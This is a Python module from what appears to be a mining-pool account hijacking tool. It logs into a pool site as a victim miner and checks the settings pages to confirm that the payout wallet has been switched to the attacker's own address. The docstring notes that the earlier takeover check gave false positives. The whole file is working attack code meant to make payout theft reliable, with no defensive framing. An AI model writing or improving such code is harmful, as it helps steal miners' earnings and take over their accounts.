"""Confirm a payout field really holds our address.

takeover() used to accept the wallet appearing anywhere in the response, which
includes the echoed form value we just posted. This re-reads the account page
and compares the actual payout input.
"""
import httpx

TIMEOUT = 15


async def confirms(spec, miner: str, ours: str) -> tuple[bool, str]:
    from . import hijack

    base = "https://" + spec["host"]
    async with httpx.AsyncClient(headers={"User-Agent": hijack.UA},
                                 follow_redirects=True, timeout=TIMEOUT) as c:
        try:
            await c.get(base + "/")
        except Exception as e:
            return False, f"verify warmup:{type(e).__name__}"
        if not await hijack._login(c, base, miner):
            return False, "verify login blocked"
        for p in ("/account", "/account/settings", "/settings"):
            try:
                r = await c.get(base + p)
            except Exception:
                continue
            if r.status_code >= 400:
                continue
            cur = hijack.current_payout(r.text)
            if not cur:
                continue
            if cur.lower() == ours.lower():
                return True, f"verified {cur[:10]}"
            return False, f"field holds {cur[:10]}"
        return False, "payout field not found"